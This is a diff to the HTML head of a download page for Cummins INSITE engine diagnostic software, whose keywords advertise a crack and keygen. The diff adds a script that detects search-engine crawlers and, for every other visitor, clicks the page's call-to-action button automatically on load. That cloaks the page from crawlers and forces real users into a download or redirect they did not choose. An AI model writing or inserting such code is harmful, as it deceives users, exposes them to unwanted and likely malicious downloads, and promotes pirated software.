@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins INSITE 7.6.2.240</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Cummins INSITE 7.6.2.240 is an engine diagnostic tool for all regions, compatible with Inline 5/6, Nexiq USB Link, and DPA5, supporting Windows 7, 8, and 10.">
     <meta name="keywords" content="Cummins INSITE 7.6.2.240, Cummins INSITE diagnostic software, Cummins INSITE software download, Cummins INSITE 7.6.2.240 free download, Cummins INSITE 7.6.2.240 crack, Cummins INSITE 7.6.2.240 keygen, Cummins INSITE 7.6.2.240 diagnostic tool, Cummins INSITE diagnostic tool 2013, Cummins INSITE 7.6.2.240 Windows software, Cummins INSITE Inline 5 support, Cummins INSITE Inline 6 support, Nexiq USB Link software, DPA5 software, Cummins engine diagnostic, Cummins software 2013">
     <style>
